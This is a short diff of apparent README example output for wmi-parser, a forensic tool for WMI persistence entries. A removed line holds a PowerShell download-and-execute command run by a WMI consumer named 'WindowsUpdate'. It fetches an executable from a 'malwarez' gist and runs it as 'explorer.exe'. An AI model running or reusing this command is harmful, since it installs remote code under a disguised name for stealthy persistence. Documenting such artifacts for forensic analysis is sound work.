@@ -26,13 +26,13 @@ https://github.com/woanware/wmi-parser
       Filter Name : SCM Event Log Filter
       Filter Query: select * from MSFT_SCMEventLogEvent
 
-  WindowsUpdate-DriveChanged
+  BadStuff-DeviceDocked
 
-    Name: WindowsUpdate
+    Name: BadStuff
     Type: CommandLineEventConsumer
-    Arguments: powershell.exe -NoP [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('https://gist.github.com/malwarez/ZXCVBN.exe?raw=true','explorer.exe'); Start-Process ('explorer.exe')
+    Arguments: powershell.exe -NoP Start-Process ('badstuff.exe')
 
     Filter:
-      Filter Name : DriveChanged
-      Filter Query: SELECT * FROM Win32_VolumeChangeEvent
+      Filter Name : DeviceDocked
+      Filter Query: SELECT * FROM Win32_SystemConfigurationChangeEvent 
 ```
